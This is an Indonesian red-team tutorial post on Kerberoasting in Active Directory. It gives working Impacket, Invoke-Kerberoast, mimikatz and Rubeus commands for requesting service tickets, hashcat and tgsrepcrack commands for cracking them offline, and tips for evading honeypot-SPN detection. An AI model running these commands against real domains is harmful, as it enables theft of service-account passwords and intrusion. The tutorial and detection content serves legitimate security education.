---
title: '[Kerberos] Kerberoasting'
date: 2022-03-09 23:20:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [red team, active directory hacking, windows hacking, post compromise attack, kerberos, impacket, mimikatz, rubeus]      # TAG names should always be lowercase
author: nairpaa
---


Dalam lingkungan Active Directory, *service* berjalan di bawah konteks akun pengguna, yang dapat berupa akun lokal (`LocalSystem`, `LocalService`, `NetworkService`) atau akun domain (contoh: `DOMAIN\mssql`). 

Setiap *service* ini memiliki *Service Principal Name* (SPN) yang unik, yang berfungsi sebagai identifikasi untuk *service* tersebut dalam lingkungan Kerberos. SPN ini terhubung dengan akun yang menjalankan *service* dan dikonfigurasi pada `User Object` dalam Active Directory.

![SPN User Object](/assets/img/posts/kerberoasting/1.png)
_SPN User Object_

Bagian dari **Ticket Granting Service (TGS)** yang dikembalikan oleh *Key Distribution Center* (KDC) dienkripsi dengan rahasia yang berasal dari password akun pengguna yang menjalankan *service* tersebut. 

**Kerberoasting** adalah teknik yang memanfaatkan protokol Kerberos untuk memungkinkan penyerang memperoleh tiket layanan yang dienkripsi (TGS), lalu mencoba memecahkan enkripsi tersebut secara offline untuk mendapatkan password *plaintext* dari akun domain.

Teknik ini bisa digunakan untuk mendapatkan password *service* yang lemah, yang kemudian dapat digunakan untuk eskalasi hak istimewa atau *lateral movement* dalam jaringan.

## 0x1 - Exploitation Stages

### A. Impacket

```bash
# List user SPN dan request service ticket
➜ GetUserSPNs.py <full-domain>/<user>:<password> -dc-ip <ip-dc> -request
```

### B. Invoke-Kerberoast.ps1

- [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

```powershell
# Kerberoasting via Invoke-Kerberoast.ps1
PS> .\Invoke-Kerberoast.ps1
PS> invoke-kerberoast -outputformat hashcat

# Kerberoasting dalam satu baris
PS> powershell -c import-module .\Invoke-Kerberoast.ps1; invoke-kerberoast -outputformat hashcat
```

### C. PowerView + Mimikatz

```powershell
# 1. List user SPN
PS> .\GetUserSPNs.ps1

# 2. Request service ticket
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "TRYHARDER-DC/SQLService.KATUHU.local:60111"

# 3. Ekstrak ticket (.kirbi) menggunakan mimikatz
mimikatz > kerberos::list /export
```

### D. Rubeus

```powershell
# Kerberoasting menggunakan Rubeus
PS > .\Rubeus.exe kerberoast /simple /nowrap
```

> Meskipun Rubeus tidak menyertakan akun `krbtgt`, akun ini [terkadang](https://twitter.com/_wald0/status/1361720293539139589) dapat di-*crack*.
{: .prompt-tip }

## 0x2 - Crack the Ticket

- [tgsrepcrack.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)

```bash
# Menggunakan tgsrepcrack.py
➜ python3 tgsrepcrack.py <wordlist.txt> <file.kirbi> 

# Menggunakan hashcat
➜ hashcat -m 13100 <file.kirbi> <wordlist.txt> 
```


> **OPSEC**
>
> Secara default, Rubeus akan melakukan *roasting* pada setiap akun yang memiliki SPN.  Akun *Honey Pot* dapat dikonfigurasikan dengan SPN "palsu", yang akan menghasilkan *event* 4769 ketika di-*roasted*. 
> 
> Karena *event* ini tidak akan pernah men-*generate* untuk *service* tersebut, maka ini memberikan indikasi yang sangat akurat untuk serangan *keberoasting*.
> 
> Anda dapat mendeteksi ini dengan mencari kode *event* dan nama *service*:
> ```
> event.code: 4769 and winlog.event_data.ServiceName: honey_svc
> ```
{: .prompt-danger}

Untuk menghindari mendapatkan perhatian yang tidak diinginkan, pendekatan yang lebih aman adalah dengan mengenumerasi kandidat yang memungkinkan dan me-*roast*-nya secara selektif. 

Kita dapat menggunakan kueri LDAP seperti yang ditunjukkan di bawah ini untuk menemukan pengguna domain yang memiliki SPN:

```powershell
PS > .\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
```

Kemudian, Anda bisa meroast akun individu dengan parameter `/user`:

```powershell
PS > .\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```


---

## 0x3 - References

- https://adsecurity.org/?p=1729
- https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync
- https://www.qomplx.com/kerberos_dcsync_attacks_explained/
- https://www.youtube.com/watch?v=aSAZzIqGeiY
- https://yojimbosecurity.ninja/dcsync/#org4679e78
- https://burmat.gitbook.io/security/hacking/domain-exploitation
